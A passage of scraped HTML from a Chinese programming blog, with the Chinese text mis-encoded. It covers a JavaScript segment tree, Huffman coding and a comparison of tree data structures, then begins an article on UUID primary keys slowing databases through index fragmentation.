    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">build</span>(rightChild, mid + <span class="hljs-number">1</span>, r, nums); <span class="hljs-comment">// é€’å½’æ„å»ºå³å­æ ‘</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tree</span>[node] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tree</span>[leftChild] + <span class="hljs-variable language_">this</span>.<span class="hljs-property">tree</span>[rightChild]; <span class="hljs-comment">// åˆå¹¶å·¦å³å­æ ‘å€¼</span>
  }

  <span class="hljs-comment">// å•ç‚¹æ›´æ–°ï¼ˆidxï¼šåŸæ•°ç»„ç´¢å¼•ï¼Œvalï¼šæ–°å€¼ï¼‰</span>
  <span class="hljs-title function_">update</span>(<span class="hljs-params">idx, val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_update</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">n</span> - <span class="hljs-number">1</span>, idx, val);
  }

  <span class="hljs-title function_">_update</span>(<span class="hljs-params">node, l, r, idx, val</span>) {
    <span class="hljs-keyword">if</span> (l === r) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tree</span>[node] = val; <span class="hljs-comment">// æ›´æ–°å¶å­èŠ‚ç‚¹</span>
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">const</span> mid = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((l + r) / <span class="hljs-number">2</span>);
    <span class="hljs-keyword">const</span> leftChild = <span class="hljs-number">2</span> * node + <span class="hljs-number">1</span>;
    <span class="hljs-keyword">const</span> rightChild = <span class="hljs-number">2</span> * node + <span class="hljs-number">2</span>;
    <span class="hljs-keyword">if</span> (idx &lt;= mid) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_update</span>(leftChild, l, mid, idx, val);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_update</span>(rightChild, mid + <span class="hljs-number">1</span>, r, idx, val);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tree</span>[node] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tree</span>[leftChild] + <span class="hljs-variable language_">this</span>.<span class="hljs-property">tree</span>[rightChild]; <span class="hljs-comment">// å›æº¯æ›´æ–°çˆ¶èŠ‚ç‚¹</span>
  }

  <span class="hljs-comment">// åŒºé—´æŸ¥è¯¢ï¼ˆql/qrï¼šæŸ¥è¯¢åŒºé—´ï¼‰</span>
  <span class="hljs-title function_">query</span>(<span class="hljs-params">ql, qr</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_query</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">n</span> - <span class="hljs-number">1</span>, ql, qr);
  }

  <span class="hljs-title function_">_query</span>(<span class="hljs-params">node, l, r, ql, qr</span>) {
    <span class="hljs-keyword">if</span> (r &lt; ql || l &gt; qr) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// å®Œå…¨ä¸é‡å ï¼Œè¿”å›0</span>
    <span class="hljs-keyword">if</span> (ql &lt;= l &amp;&amp; r &lt;= qr) <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">tree</span>[node]; <span class="hljs-comment">// å®Œå…¨é‡å ï¼Œè¿”å›å½“å‰èŠ‚ç‚¹å€¼</span>
    <span class="hljs-keyword">const</span> mid = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((l + r) / <span class="hljs-number">2</span>);
    <span class="hljs-keyword">const</span> leftChild = <span class="hljs-number">2</span> * node + <span class="hljs-number">1</span>;
    <span class="hljs-keyword">const</span> rightChild = <span class="hljs-number">2</span> * node + <span class="hljs-number">2</span>;
    <span class="hljs-keyword">const</span> leftSum = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_query</span>(leftChild, l, mid, ql, qr);
    <span class="hljs-keyword">const</span> rightSum = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_query</span>(rightChild, mid + <span class="hljs-number">1</span>, r, ql, qr);
    <span class="hljs-keyword">return</span> leftSum + rightSum; <span class="hljs-comment">// éƒ¨åˆ†é‡å ï¼Œåˆå¹¶ç»“æœ</span>
  }
}

<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-keyword">const</span> nums = [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>];
<span class="hljs-keyword">const</span> st = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SegmentTree</span>(nums);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(st.<span class="hljs-title function_">query</span>(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>)); <span class="hljs-comment">// 3+5+7+9=24</span>
st.<span class="hljs-title function_">update</span>(<span class="hljs-number">2</span>, <span class="hljs-number">6</span>); <span class="hljs-comment">// ç´¢å¼•2çš„å€¼ä»5æ”¹ä¸º6</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(st.<span class="hljs-title function_">query</span>(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>)); <span class="hljs-comment">// 3+6+7+9=25</span>
    
</code></pre>
<h4 data-id="heading-19">4.4 åº”ç”¨åœºæ™¯</h4>
<p>çº¿æ®µæ ‘çš„æ ¸å¿ƒä¼˜åŠ¿æ˜¯é«˜æ•ˆå¤„ç†åŒºé—´æŸ¥è¯¢ä¸æ›´æ–°ï¼Œå› æ­¤å…¶åº”ç”¨åœºæ™¯ä¸»è¦é›†ä¸­åœ¨éœ€è¦é¢‘ç¹æ“ä½œåŒºé—´æ•°æ®çš„åœºæ™¯ï¼š</p>
<ul>
<li>
<p>åŒºé—´å’Œã€åŒºé—´æœ€å€¼ã€åŒºé—´ç§¯çš„é«˜é¢‘æŸ¥è¯¢ä¸æ›´æ–°ï¼›</p>
</li>
<li>
<p>åŠ¨æ€æ•°ç»„çš„åŒºé—´æ“ä½œï¼ˆå¦‚è‚¡ç¥¨åŒºé—´æœ€å¤§æ¶¨å¹…ã€åŒºé—´å…ƒç´ ä¿®æ”¹ï¼‰ï¼›</p>
</li>
<li>
<p>ç®—æ³•åˆ·é¢˜ä¸­çš„åŒºé—´é—®é¢˜ï¼ˆå¦‚åŠ›æ‰£307. åŒºåŸŸå’Œæ£€ç´¢ - æ•°ç»„å¯ä¿®æ”¹ï¼‰ã€‚</p>
</li>
</ul>
<h3 data-id="heading-20">äº”ã€éœå¤«æ›¼æ ‘ï¼šæœ€ä¼˜å‰ç¼€ç¼–ç ï¼ˆæ•°æ®å‹ç¼©æ ¸å¿ƒï¼‰</h3>
<h4 data-id="heading-21">5.1 æ ¸å¿ƒå®šä½</h4>
<p>éœå¤«æ›¼æ ‘ï¼ˆæœ€ä¼˜å‰ç¼€ç¼–ç æ ‘ï¼‰æ˜¯äºŒå‰æ ‘çš„ç»å…¸åº”ç”¨ï¼Œæ ¸å¿ƒç”¨äºã€Œæ— æŸæ•°æ®å‹ç¼©ã€ã€‚å®ƒé€šè¿‡ç»Ÿè®¡å­—ç¬¦å‡ºç°é¢‘ç‡ï¼Œæ„å»ºä¸€æ£µã€Œå¸¦æƒè·¯å¾„é•¿åº¦ï¼ˆWPLï¼‰æœ€å°ã€çš„äºŒå‰æ ‘ï¼ŒåŸºäºè¯¥æ ‘ç”Ÿæˆçš„éœå¤«æ›¼ç¼–ç ï¼Œèƒ½åœ¨ä¿è¯è§£ç å”¯ä¸€æ€§çš„å‰æä¸‹ï¼Œå®ç°æœ€é«˜çš„å‹ç¼©ç‡ã€‚</p>
<h4 data-id="heading-22">5.2 æ ¸å¿ƒåŸç†</h4>
<p>å…ˆæ˜ç¡®ä¸¤ä¸ªåŸºç¡€æ¦‚å¿µï¼š</p>
<ul>
<li>
<p>æ— æŸå‹ç¼©ï¼šå‹ç¼©åçš„æ•°æ®å¯å®Œå…¨è¿˜åŸï¼Œæ— ä¿¡æ¯ä¸¢å¤±ï¼ˆå¦‚ZIPå‹ç¼©ï¼‰ï¼›</p>
</li>
<li>
<p>å˜é•¿ç¼–ç ï¼šä¸åŒå­—ç¬¦çš„ç¼–ç é•¿åº¦ä¸åŒï¼Œé¢‘ç‡é«˜çš„å­—ç¬¦ç¼–ç æ›´çŸ­ï¼ˆå¯¹æ¯”ASCIIå®šé•¿ç¼–ç ï¼ŒèŠ‚çœç©ºé—´ï¼‰ã€‚</p>
</li>
</ul>
<p>éœå¤«æ›¼æ ‘çš„æ ¸å¿ƒé€»è¾‘æ˜¯ï¼š<strong>é¢‘ç‡é«˜çš„å­—ç¬¦ï¼Œæ”¾åœ¨ç¦»æ ¹èŠ‚ç‚¹æ›´è¿‘çš„ä½ç½®ï¼ˆç¼–ç æ›´çŸ­ï¼‰ï¼›é¢‘ç‡ä½çš„å­—ç¬¦ï¼Œæ”¾åœ¨ç¦»æ ¹èŠ‚ç‚¹æ›´è¿œçš„ä½ç½®ï¼ˆç¼–ç æ›´é•¿ï¼‰</strong>ï¼Œä»¥æ­¤ç¡®ä¿æ•´ä¸ªæ ‘çš„WPLï¼ˆæ‰€æœ‰å¶å­èŠ‚ç‚¹ã€Œé¢‘ç‡Ã—è·¯å¾„é•¿åº¦ã€ä¹‹å’Œï¼‰æœ€å°ï¼Œå³å‹ç¼©ç‡æœ€é«˜ã€‚</p>
<p>ç¼–ç è§„åˆ™ï¼šå·¦å­æ ‘ä¸º0ï¼Œå³å­æ ‘ä¸º1ï¼Œæ ¹åˆ°å¶å­èŠ‚ç‚¹çš„è·¯å¾„å³ä¸ºå­—ç¬¦ç¼–ç ã€‚ä»¥å­—ç¬¦é¢‘ç‡ï¼ˆa:10ã€b:8ã€c:9ã€d:2ã€e:5ï¼‰ä¸ºä¾‹ï¼Œå…·ä½“ç¼–ç ä¸WPLè®¡ç®—å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p>a: 0ï¼ˆè·¯å¾„é•¿åº¦1ï¼Œ10Ã—1=10ï¼‰ï¼›</p>
</li>
<li>
<p>b: 10ï¼ˆè·¯å¾„é•¿åº¦2ï¼Œ8Ã—2=16ï¼‰ï¼›</p>
</li>
<li>
<p>c: 110ï¼ˆè·¯å¾„é•¿åº¦3ï¼Œ9Ã—3=27ï¼‰ï¼›</p>
</li>
<li>
<p>d: 1110ï¼ˆè·¯å¾„é•¿åº¦4ï¼Œ2Ã—4=8ï¼‰ï¼›</p>
</li>
<li>
<p>e: 1111ï¼ˆè·¯å¾„é•¿åº¦4ï¼Œ5Ã—4=20ï¼‰ï¼›</p>
</li>
<li>
<p>WPL=10+16+27+8+20=81ï¼ˆæœ€å°å¸¦æƒè·¯å¾„é•¿åº¦ï¼‰ã€‚</p>
</li>
</ul>
<p>è§£ç å”¯ä¸€æ€§ï¼šä»»æ„å­—ç¬¦çš„ç¼–ç ï¼Œéƒ½ä¸æ˜¯å¦ä¸€ä¸ªå­—ç¬¦ç¼–ç çš„å‰ç¼€ï¼ˆå¦‚açš„ç¼–ç 0ï¼Œä¸ä¼šæ˜¯bçš„ç¼–ç 10çš„å‰ç¼€ï¼‰ï¼Œç¡®ä¿è§£ç æ—¶æ— æ­§ä¹‰ï¼Œè¿™ä¹Ÿæ˜¯éœå¤«æ›¼ç¼–ç èƒ½å®ç°æ— æŸå‹ç¼©çš„å…³é”®å‰æï¼Œä¹Ÿå¥ å®šäº†å…¶åœ¨æ•°æ®å‹ç¼©é¢†åŸŸçš„åº”ç”¨åŸºç¡€ã€‚</p>
<h4 data-id="heading-23">5.3 åº”ç”¨åœºæ™¯</h4>
<ul>
<li>
<p>æ— æŸæ•°æ®å‹ç¼©ï¼ˆZIPã€PNGå›¾ç‰‡å‹ç¼©çš„æ ¸å¿ƒç®—æ³•ä¹‹ä¸€ï¼‰ï¼›</p>
</li>
<li>
<p>æ–‡æœ¬ç¼–ç ã€é€šä¿¡ä¼ è¾“ï¼ˆèŠ‚çœå¸¦å®½ï¼Œæé«˜ä¼ è¾“æ•ˆç‡ï¼‰ï¼›</p>
</li>
<li>
<p>é¢‘ç‡ç›¸å…³çš„æœ€ä¼˜ç¼–ç åœºæ™¯ï¼ˆå¦‚æ—¥å¿—å‹ç¼©ã€æ•°æ®å­˜å‚¨ä¼˜åŒ–ï¼‰ã€‚</p>
</li>
</ul>
<h3 data-id="heading-24">å…­ã€æ€»ç»“ï¼š5ç§æ ‘ç»“æ„çš„æ ¸å¿ƒå¯¹æ¯”ä¸å…³è”</h3>
<p>è¿™5ç§æ ‘ç»“æ„å‡è¡ç”Ÿè‡ªäºŒå‰æ ‘ï¼Œç»§æ‰¿äº†ã€Œåˆ†æ²»ã€çš„æ ¸å¿ƒæ€æƒ³ï¼Œä½†é’ˆå¯¹ä¸åŒåœºæ™¯åšäº†é’ˆå¯¹æ€§ä¼˜åŒ–ï¼Œæ ¸å¿ƒå¯¹æ¯”å¦‚ä¸‹ï¼Œå¯å¿«é€Ÿç†æ¸…æ¯ç§ç»“æ„çš„æ ¸å¿ƒå·®å¼‚ä¸é€‚ç”¨åœºæ™¯ï¼š</p>















































<table><thead><tr><th>æ•°æ®ç»“æ„</th><th>æ ¸å¿ƒç‰¹æ€§</th><th>æ—¶é—´å¤æ‚åº¦ï¼ˆå¢åˆ æŸ¥æ”¹/æ ¸å¿ƒæ“ä½œï¼‰</th><th>æ ¸å¿ƒåº”ç”¨</th></tr></thead><tbody><tr><td>çº¢é»‘æ ‘</td><td>è‡ªå¹³è¡¡äºŒå‰æœç´¢æ ‘ï¼Œæ ‘é«˜O(logN)</td><td>O(logN)ï¼ˆæ‰€æœ‰æ“ä½œï¼‰</td><td>æœ‰åºæ•°æ®ç»´æŠ¤ã€æ ‡å‡†åº“å®ç°</td></tr><tr><td>Trieæ ‘</td><td>å¤šå‰æ ‘ï¼Œä¼˜åŒ–å­—ç¬¦ä¸²å‰ç¼€æ“ä½œ</td><td>O(L)ï¼ˆLä¸ºå­—ç¬¦ä¸²é•¿åº¦ï¼‰</td><td>è‡ªåŠ¨è¡¥å…¨ã€å‰ç¼€æŸ¥é‡ã€å­—ç¬¦ä¸²ç¼–ç </td></tr><tr><td>äºŒå‰å †</td><td>å®Œå…¨äºŒå‰æ ‘ï¼ŒåŠ¨æ€æ’åºï¼Œå¿«é€Ÿå–æœ€å€¼</td><td>O(logN)ï¼ˆpush/popï¼‰ã€O(1)ï¼ˆpeekï¼‰</td><td>ä¼˜å…ˆçº§é˜Ÿåˆ—ã€å †æ’åº</td></tr><tr><td>çº¿æ®µæ ‘</td><td>åŒºé—´åˆ†æ²»ï¼Œä¼˜åŒ–åŒºé—´æŸ¥è¯¢/æ›´æ–°</td><td>O(logN)ï¼ˆæŸ¥è¯¢/æ›´æ–°ï¼‰</td><td>åŒºé—´æ“ä½œã€åŠ¨æ€æ•°ç»„ä¼˜åŒ–</td></tr><tr><td>éœå¤«æ›¼æ ‘</td><td>æœ€ä¼˜å‰ç¼€ç¼–ç æ ‘ï¼ŒWPLæœ€å°</td><td>O(NlogN)ï¼ˆæ„å»ºï¼‰</td><td>æ— æŸæ•°æ®å‹ç¼©ã€é€šä¿¡ç¼–ç </td></tr><tr><td>æ ¸å¿ƒå…³è”ï¼šæ‰€æœ‰ç»“æ„éƒ½å›´ç»•ã€ŒäºŒå‰æ ‘çš„åˆ†æ²»æ€æƒ³ã€å±•å¼€ï¼Œé€šè¿‡ã€Œç©ºé—´æ¢æ—¶é—´ã€çš„æ€è·¯ä¼˜åŒ–æ•ˆç‡â€”â€”çº¢é»‘æ ‘ç”¨é¢œè‰²æ ‡è®°æ¢å¹³è¡¡ï¼ŒTrieæ ‘ç”¨å¤šå‰ç»“æ„æ¢å­—ç¬¦ä¸²æ“ä½œæ•ˆç‡ï¼Œçº¿æ®µæ ‘ç”¨åŒºé—´é¢„å¤„ç†æ¢åŒºé—´æ“ä½œæ•ˆç‡ï¼Œéœå¤«æ›¼æ ‘ç”¨é¢‘ç‡æ’åºæ¢å‹ç¼©ç‡ã€‚å®ƒä»¬è™½åº”ç”¨åœºæ™¯ä¸åŒï¼Œä½†åº•å±‚é€»è¾‘å‡æºäºäºŒå‰æ ‘ï¼ŒæŒæ¡è¿™ç§åˆ†æ²»æ€ç»´ï¼Œèƒ½æ›´è½»æ¾ç†è§£å„ç±»è¡ç”Ÿæ•°æ®ç»“æ„çš„è®¾è®¡æ€è·¯ï¼Œä¹Ÿèƒ½æ›´ç²¾å‡†åœ°é€‰æ‹©åˆé€‚çš„ç»“æ„è§£å†³å®é™…é—®é¢˜ã€‚</td><td/><td/><td/></tr></tbody></table>
<p>å¯¹äºæ–°æ‰‹è€Œè¨€ï¼Œæ— éœ€æ€¥äºæŒæ¡æ‰€æœ‰ç»“æ„çš„ä»£ç å®ç°ï¼Œé‡ç‚¹ç†è§£æ¯ç§ç»“æ„çš„ã€Œåº”ç”¨åœºæ™¯ã€å’Œã€Œæ ¸å¿ƒåŸç†ã€ï¼Œåˆ·é¢˜æˆ–å¼€å‘æ—¶ï¼Œèƒ½æ ¹æ®éœ€æ±‚å¿«é€Ÿé€‰æ‹©åˆé€‚çš„æ•°æ®ç»“æ„ï¼Œå°±æ˜¯æœ€å¤§çš„æ”¶è·ã€‚åç»­å¯é’ˆå¯¹å…·ä½“ç»“æ„ï¼ˆå¦‚çº¢é»‘æ ‘ã€éœå¤«æ›¼æ ‘ï¼‰æ·±å…¥ç ”ç©¶ä»£ç å®ç°ï¼Œå¤¯å®ç»†èŠ‚ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[UUIDçš„éšå½¢æˆæœ¬ï¼šä¸€ä¸ªè®©æ•°æ®åº“â€œæ…¢ä¸‹æ¥â€çš„é™·é˜±]]></title>    <link>https://juejin.cn/post/7604507125857992731</link>    <guid>https://juejin.cn/post/7604507125857992731</guid>    <pubDate>2026-02-09T09:53:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604507125857992731" data-draft-id="7604345576177467430" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="UUIDçš„éšå½¢æˆæœ¬ï¼šä¸€ä¸ªè®©æ•°æ®åº“â€œæ…¢ä¸‹æ¥â€çš„é™·é˜±"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-02-09T09:53:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜é‡‘è€…é˜¿è±ª"/> <meta itemprop="url" content="https://juejin.cn/user/4073055974333608"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            UUIDçš„éšå½¢æˆæœ¬ï¼šä¸€ä¸ªè®©æ•°æ®åº“â€œæ…¢ä¸‹æ¥â€çš„é™·é˜±
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4073055974333608/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜é‡‘è€…é˜¿è±ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T09:53:44.000Z" title="Mon Feb 09 2026 09:53:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">UUIDçš„éšå½¢æˆæœ¬ï¼šä¸€ä¸ªè®©æ•°æ®åº“â€œæ…¢ä¸‹æ¥â€çš„é™·é˜±</h2>
<p>æœ€è¿‘æˆ‘ä»¬åœ¨æ€§èƒ½ä¼˜åŒ–ä¸­å‘ç°äº†ä¸€ä¸ªéšè”½çš„é—®é¢˜ï¼šæ•°æ®åº“çš„å†™å…¥å’ŒæŸ¥è¯¢æ€§èƒ½åœ¨æ•°æ®é‡å¢é•¿åå‡ºç°æ˜æ˜¾ä¸‹é™ã€‚ç»è¿‡å±‚å±‚æ’æŸ¥ï¼Œæœ€ç»ˆå®šä½åˆ°ä¸€ä¸ªä»¤äººæ„å¤–çš„åŸå› â€”â€”æˆ‘ä»¬å¤§é‡ä½¿ç”¨çš„UUIDä½œä¸ºä¸»é”®ã€‚</p>
<p>æœ¬æ–‡å°†å‰–æUUIDåœ¨æ•°æ®åº“ä¸­çš„çœŸå®å½±å“ï¼Œè§£é‡Šä¸ºä»€ä¹ˆå®ƒå¯èƒ½æˆä¸ºç³»ç»Ÿçš„â€œæ€§èƒ½æ€æ‰‹â€ï¼Œå¹¶æä¾›æ›´ä¼˜åŒ–çš„è§£å†³æ–¹æ¡ˆã€‚</p>
<h3 data-id="heading-1">ä¸€ã€UUIDçš„å¸¸è§è®¤çŸ¥ä¸ç»“æ„</h3>
<p>UUIDï¼ˆé€šç”¨å”¯ä¸€è¯†åˆ«ç ï¼‰æ˜¯ä¸€ä¸ª128ä½çš„æ ‡è¯†ç¬¦ï¼Œæ ‡å‡†æ ¼å¼å¦‚ï¼š<code>123e4567-e89b-12d3-a456-426614174000</code></p>
<p><strong>å¸¸è§å˜ä½“ï¼š</strong></p>
<ul>
<li>UUIDv1ï¼šåŸºäºæ—¶é—´æˆ³å’ŒMACåœ°å€</li>
<li>UUIDv4ï¼šåŸºäºéšæœºæ•°ï¼ˆæœ€å¸¸ç”¨ï¼‰</li>
<li>UUIDv7ï¼šåŸºäºæ—¶é—´æˆ³çš„æœ‰åºç‰ˆæœ¬ï¼ˆè¾ƒæ–°æ ‡å‡†ï¼‰</li>
</ul>
<p><strong>å¼€å‘è€…é€‰æ‹©UUIDçš„å¸¸è§ç†ç”±ï¼š</strong></p>
<ol>
<li>å…¨å±€å”¯ä¸€ï¼Œæ— éœ€åè°ƒ</li>
<li>å®¢æˆ·ç«¯å¯ç”Ÿæˆï¼Œå‡å°‘æœåŠ¡ç«¯å‹åŠ›</li>
<li>å¤©ç„¶æ”¯æŒåˆ†å¸ƒå¼ç³»ç»Ÿ</li>
<li>é¿å…IDçŒœæµ‹å’Œéå†é£é™©</li>
</ol>
<h3 data-id="heading-2">äºŒã€æ•°æ®åº“å±‚é¢çš„éšè—é—®é¢˜</h3>
<h4 data-id="heading-3">1. ç´¢å¼•ç¢ç‰‡åŒ–ï¼šB+æ ‘çš„â€œéšå½¢æ€æ‰‹â€</h4>
<p>æ•°æ®åº“ä½¿ç”¨B+æ ‘ç´¢å¼•æ—¶ï¼Œè¦æ±‚æ–°æ•°æ®æ’å…¥åˆ°åˆé€‚ä½ç½®ä»¥ä¿æŒæ ‘å¹³è¡¡ã€‚<strong>è‡ªå¢ID</strong>å¤©ç„¶æœ‰åºï¼Œæ–°æ•°æ®æ€»æ˜¯æ’å…¥åˆ°ç´¢å¼•æœ«å°¾ã€‚</p>
<p>è€Œ<strong>éšæœºUUID</strong>çš„æ’å…¥æ¨¡å¼æ˜¯éšæœºçš„ï¼Œä¼šå¯¼è‡´ï¼š</p>
<ul>
<li>é¢‘ç¹çš„é¡µåˆ†è£‚ï¼ˆpage splitï¼‰</li>
<li>ç´¢å¼•ç¢ç‰‡åŒ–ä¸¥é‡</li>
<li>ç¼“å­˜å‘½ä¸­ç‡é™ä½</li>
<li>ç»´æŠ¤æˆæœ¬å¢åŠ </li>
</ul>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- æµ‹è¯•å¯¹æ¯”ï¼šæ’å…¥100ä¸‡æ¡æ•°æ®åçš„ç´¢å¼•ç»Ÿè®¡</span>
